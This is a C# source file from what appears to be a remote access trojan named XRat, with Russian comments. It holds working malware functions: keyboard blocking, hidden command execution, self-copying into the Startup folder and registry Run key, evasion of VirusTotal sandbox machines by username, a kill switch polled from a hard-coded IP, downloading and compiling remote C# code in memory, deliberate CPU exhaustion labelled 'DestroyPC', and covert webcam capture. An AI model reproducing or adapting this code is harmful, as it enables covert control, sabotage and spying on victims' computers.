using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;

using HtmlAgilityPack;

using Windows.Media.Capture;
using Windows.Storage.Pickers;
using Windows.Storage.Streams;
using Windows.Storage;
using Microsoft.Win32;


namespace XRat
{
    public static class Utils
    {
        private static string filePath = string.Empty;


        // Подключаем необходимые Windows API
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0; // Скрыть окно
        const int SW_SHOW = 5; // Показать окно

        [DllImport("user32.dll")]
        private static extern int BlockInput(int fBlockIt);

        public static void BlockKeyboard()
        {
            // Блокируем клавиатуру
            BlockInput(1);
        }

        public static void UnblockKeyboard()
        {
            // Разблокируем клавиатуру
            BlockInput(0);
        }

        public static bool CMD(string command)
        {
            // Start the CMD process with /min flag to run it minimized
            var processStartInfo = new ProcessStartInfo
            {
                FileName = "CMD.exe",
                Arguments = $"/min /C {command}",  // /min to minimize the CMD window, /C to execute and then terminate CMD
                RedirectStandardOutput = true, // Optionally capture output
                RedirectStandardError = true,  // Optionally capture errors
                UseShellExecute = false,
                CreateNoWindow = true
            };

            try
            {
                using (var process = Process.Start(processStartInfo))
                {
                    if (process == null)
                    {
                        throw new InvalidOperationException("Failed to start CMD.exe process.");
                    }

                    // Wait for the process to exit
                    process.WaitForExit();
                }

                return true;
            }
            catch
            {
                return false;
            }
        }

        public static (bool success, string output) ProCMD(string command)
        {
            string output = string.Empty;

            // Start the CMD process with /min flag to run it minimized
            var processStartInfo = new ProcessStartInfo
            {
                FileName = "CMD.exe",
                Arguments = $"/min /C {command}",  // /min to minimize the CMD window, /C to execute and then terminate CMD
                RedirectStandardOutput = true, // Optionally capture output
                RedirectStandardError = true,  // Optionally capture errors
                UseShellExecute = false,
                CreateNoWindow = true
            };

            try
            {
                using (var process = Process.Start(processStartInfo))
                {
                    if (process == null)
                    {
                        throw new InvalidOperationException("Failed to start CMD.exe process.");
                    }

                    // Read the standard output
                    output = process.StandardOutput.ReadToEnd();

                    // Optionally, you can also capture errors
                    string errorOutput = process.StandardError.ReadToEnd();

                    // Wait for the process to exit
                    process.WaitForExit();
                }

                return (true, output); // Return success and the output string
            }
            catch (Exception ex)
            {
                return (false, $"Error: {ex.Message}"); // Return failure and the error message
            }
        }

        public static bool Hide()
        {
            // Получаем дескриптор консольного окна
            IntPtr hConsole = GetConsoleWindow();

            try
            {
                // Скрываем консольное окно
                ShowWindow(hConsole, SW_HIDE);
            }
            catch { return false; }

            return true;
        }

        public static bool Show()
        {
            // Получаем дескриптор консольного окна
            IntPtr hConsole = GetConsoleWindow();

            try
            {
                // Вернуть окно обратно:
                ShowWindow(hConsole, SW_SHOW);
            }
            catch { return false; }

            return true;
        }

        public static string Startup()
        {
            Settings.filename = Settings.filename + ".exe";

            // Получаем путь к папке автозагрузки текущего пользователя
            string userStartupFolder = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.Startup)
            );

            // Получаем путь до файла (с расширением)
            string sourceFilePath = ProCMD("pwd").output;
            sourceFilePath = sourceFilePath + Settings.filename;

            // Путь, куда будет скопирован файл
            string destinationFilePath = Path.Combine(userStartupFolder, Settings.filename);

            // Копируем файл в папку автозагрузки, если он не существует там
            try
            {
                if (!File.Exists(destinationFilePath))
                {
                    // Копирование самого себя в папку автозагрузки
                    File.Copy(sourceFilePath, destinationFilePath);
                    return $"Программа успешно скопирована в автозагрузку: {destinationFilePath}";
                }
                else
                {
                    return "Программа уже существует в папке автозагрузки.";
                }
            }
            catch (Exception ex)
            {
                return $"Произошла ошибка: {ex.Message}";
            }
        }

        static void AddToStartupRegedit(string[] args)
        {
            Settings.filename = Settings.filename + ".exe";

            // Получаем путь до файла (с расширением)
            string sourceFilePath = ProCMD("pwd").output;
            sourceFilePath = sourceFilePath + Settings.filename;

            // Путь к вашему приложению
            string appPath = sourceFilePath;

            // Имя записи в реестре
            string appName = "MyApp";

            // Добавляем запись в реестр
            AddToStartup(appPath, appName);

            Console.WriteLine("Программа добавлена в автозагрузку.");
        }

        static void AddToStartup(string appPath, string appName)
        {
            // Получаем доступ к ключу реестра для автозагрузки
            RegistryKey startupKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);

            if (startupKey != null)
            {
                // Добавляем приложение в автозагрузку
                startupKey.SetValue(appName, appPath);
            }
            else
            {
                Console.WriteLine("Не удалось получить доступ к реестру.");
            }
        }

        public static void CheckVirusTotal()
        {
            string[] virusTotalUsers = ["shloblack", "seanwalla", "azure", "abby", "george", "bruno", "rtucker", "john", "administrator", "anrose"];
            string username = string.Empty;
            try
            {
                username = ProCMD("whoami").output;
                username = username.Split('\\')[1];
            }
            catch (Exception ex)
            {
                Environment.Exit(0);
            }

            if (virusTotalUsers.Contains(username))
            {
                Environment.Exit(0); // Leaving if it's VirusTotal VM
            }
        }

        public static async Task<string> Validable()
        {
            try
            {
                // Логируем URL и попытку получения данных
                Console.WriteLine("Получаем данные с URL...");
                return await ParseTextFromRawLink("http://95.31.8.49:5000/xrat/xratactivity");
            }
            catch (Exception ex)
            {
                // Логируем ошибку при вызове Validable
                Console.WriteLine($"Ошибка при вызове Validable: {ex.Message}");
                return string.Empty;
            }
        }

        public static async Task ControlXRatGlobaActivity()
        {
            try
            {
                // Получаем статус глобальной активности
                string valid = await Validable();
                Console.WriteLine($"Полученное значение: '{valid}'");

                if (string.IsNullOrEmpty(valid))
                {
                    Console.WriteLine("Получено пустое значение.");
                    return;
                }

                if (valid == "false")
                {
                    Console.WriteLine("Globally off");

                    string username = ProCMD("whoami").output;
                    username = username.Split('\\')[1];

                    string autostartPath = $@"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{Settings.filename + ".exe"}";
                    string command = $"del \"{autostartPath}\"";  // Используем кавычки для корректной работы с путями

                    // Проверяем успешность выполнения команды
                    if (ProCMD(command).success)
                    {
                        Console.WriteLine("Success");
                    }
                    else
                    {
                        Console.WriteLine("Failed");
                    }

                    // Завершаем выполнение программы (можно заменить на корректный выход)
                    Environment.Exit(0);
                }
                else
                {
                    Console.WriteLine("Globally on");
                }

                if (valid == "")
                {
                    Environment.Exit(0);
                }
            }
            catch (Exception ex)
            {
                // Логируем ошибку и выводим сообщение
                Console.WriteLine($"Ошибка в ControlXRatGlobaActivity: {ex.Message}");
            }
        }

        public static async Task<string> ParseTextFromRawLink(string url)
        {
            using (HttpClient client = new HttpClient())
            {
                try
                {
                    // Получаем HTML-контент страницы
                    Console.WriteLine($"Получаем данные с URL: {url}");
                    string htmlContent = await client.GetStringAsync(url);

                    // Логируем полученные данные (например, первые 500 символов)
                    Console.WriteLine($"Полученные данные:\n{htmlContent.Substring(0, Math.Min(500, htmlContent.Length))}");

                    return htmlContent.Substring(0, Math.Min(500, htmlContent.Length));
                }
                catch (Exception ex)
                {
                    // Логируем ошибку
                    Console.WriteLine($"Произошла ошибка при скачивании или парсинге страницы: {ex.Message}");

                    // Возвращаем пустую строку в случае ошибки
                    return string.Empty;
                }
            }
        }

        public static async Task<string> ParseCodeFromRawLink(string url)
        {
            using (HttpClient client = new HttpClient())
            {
                try
                {
                    // Получаем HTML-контент страницы
                    Console.WriteLine($"Получаем данные с URL: {url}");
                    string htmlContent = await client.GetStringAsync(url);

                    // Логируем полученные данные (например, первые 500 символов)
                    Console.WriteLine($"Полученные данные:\n{htmlContent.Substring(0, Math.Min(500, htmlContent.Length))}");

                    // Создаем объект HtmlDocument для парсинга HTML
                    var htmlDocument = new HtmlDocument();
                    htmlDocument.LoadHtml(htmlContent);

                    // Извлекаем все теги <pre>
                    var preTags = htmlDocument.DocumentNode.SelectNodes("//pre");

                    // Если теги <pre> найдены, возвращаем содержимое первого
                    if (preTags != null && preTags.Count > 0)
                    {
                        Console.WriteLine("Тег <pre> найден, возвращаем данные.");
                        return preTags[0].InnerText; // Возвращаем текст первого тега <pre>
                    }
                    else
                    {
                        // Если теги <pre> не найдены, выводим информацию и возвращаем пустую строку
                        Console.WriteLine("Теги <pre> не найдены.");
                        return string.Empty;
                    }
                }
                catch (Exception ex)
                {
                    // Логируем ошибку
                    Console.WriteLine($"Произошла ошибка при скачивании или парсинге страницы: {ex.Message}");

                    // Возвращаем пустую строку в случае ошибки
                    return string.Empty;
                }
            }
        }

        public static async Task ModuleLoader(string link)
        {
            await ExecuteCodeFromText(await ParseCodeFromRawLink(link));
        }
        public static async Task ExecuteCodeFromText(string code)
        {
            await Task.Run(() =>
            {
                // Создание компилятора
                CSharpCodeProvider provider = new CSharpCodeProvider();

                // Настройка параметров компиляции
                CompilerParameters parameters = new CompilerParameters
                {
                    GenerateExecutable = false,
                    GenerateInMemory = true
                };

                // Компиляция кода
                CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);

                // Проверка наличия ошибок компиляции
                if (results.Errors.HasErrors)
                {
                    //Console.WriteLine("Ошибка компиляции:");
                    foreach (CompilerError error in results.Errors)
                    {
                        //Console.WriteLine("  {0}", error.ErrorText);
                    }
                }
                else
                {
                    // Создание экземпляра класса и вызов метода
                    Assembly assembly = results.CompiledAssembly;
                    Type type = assembly.GetType("UserClass");
                    if (type != null)
                    {
                        dynamic instance = Activator.CreateInstance(type);
                        instance.Execute();
                    }
                    else
                    {
                        //Console.WriteLine("Не найден класс UserClass.");
                    }
                }
            });
        }


        public static void DestroyPCOld()
        {
            int numberOfThreads = Environment.ProcessorCount; // Получаем количество логических процессоров
            int targetLoad = 90; // Целевая нагрузка - 90%

            // Вычисляем, сколько процентов времени процессор должен быть занят
            int workTime = 100; // Время работы в миллисекундах
            int idleTime = (100 - targetLoad); // Время бездействия

            // Статический Random, чтобы избежать многократного создания в потоках
            Random random = new Random();

            // Запускаем несколько потоков
            for (int i = 0; i < numberOfThreads; i++)
            {
                Thread t = new Thread(() =>
                {
                    while (true)
                    {
                        // Нагружаем процессор на заданный процент
                        var sw = Stopwatch.StartNew();
                        while (sw.ElapsedMilliseconds < workTime)
                        {
                            // Сложные вычисления для загрузки процессора
                            // Используем более сложные вычисления для увеличения нагрузки
                            double result = 0;
                            for (int j = 0; j < 1000; j++)
                            {
                                result += Math.Sqrt(random.NextDouble());
                            }
                        }

                        // Отдыхаем, чтобы не создать 100% нагрузку
                        // Используем точный расчет времени отдыха
                        long sleepTime = idleTime - sw.ElapsedMilliseconds;
                        if (sleepTime > 0)
                        {
                            Thread.Sleep((int)sleepTime);
                        }
                    }
                });
                t.IsBackground = true; // Потоки будут завершаться при завершении программы
                t.Start();
            }
        }

        public static void DestroyPC()
        {
            // Количество потоков для создания нагрузки на процессор
            int numThreads = 160;  // Увеличиваем количество потоков для большей нагрузки

            // Массив потоков
            Thread[] threads = new Thread[numThreads];

            // Запускаем каждый поток
            for (int i = 0; i < numThreads; i++)
            {
                threads[i] = new Thread(GenerateCpuLoad);
                threads[i].Start();
            }

            Console.WriteLine("Запущено несколько потоков для нагрузки на процессор.");
            Console.WriteLine("Нажмите любую клавишу для завершения.");
            Console.ReadKey();

            // Ожидаем завершения всех потоков
            for (int i = 0; i < numThreads; i++)
            {
                threads[i].Join();
            }

            Console.WriteLine("Все потоки завершены.");
        }

        // Метод для создания нагрузки на процессор
        public static void GenerateCpuLoad()
        {
            // Вечный цикл, который создает интенсивную нагрузку
            while (true)
            {
                // Процессор будет занят выполнением вычислений
                double result = Math.Sqrt(Math.PI) * Math.Sqrt(Math.E); // Более ресурсоемкие вычисления
            }
        }

        public static async Task<string> WebCamAsync()
        {
            // Запрашиваем доступ к камере
            var mediaCapture = new MediaCapture();
            await mediaCapture.InitializeAsync();

            // Создаем пикер для выбора места сохранения
            var picker = new FileSavePicker
            {
                SuggestedStartLocation = PickerLocationId.Downloads,
                SuggestedFileName = "WebcamCapture_" + DateTime.Now.ToString("yyyyMMdd_HHmmss")
            };
            picker.FileTypeChoices.Add("JPEG Image", new[] { ".jpg" });

            // Ожидаем выбора пути для сохранения файла
            StorageFile file = await picker.PickSaveFileAsync();
            if (file == null)
            {
                //throw new InvalidOperationException("Не был выбран путь для сохранения.");
            }

            // Делаем снимок с камеры
            var photoStream = new InMemoryRandomAccessStream();
            await mediaCapture.CapturePhotoToStreamAsync(Windows.Media.MediaProperties.ImageEncodingProperties.CreateJpeg(), photoStream);

            // Сохраняем снимок в файл
            var fileStream = await file.OpenStreamForWriteAsync();
            photoStream.Seek(0);
            await photoStream.AsStreamForRead().CopyToAsync(fileStream);
            fileStream.Close();

            return file.Path;  // Возвращаем путь к сохраненному файлу
        }
    }
}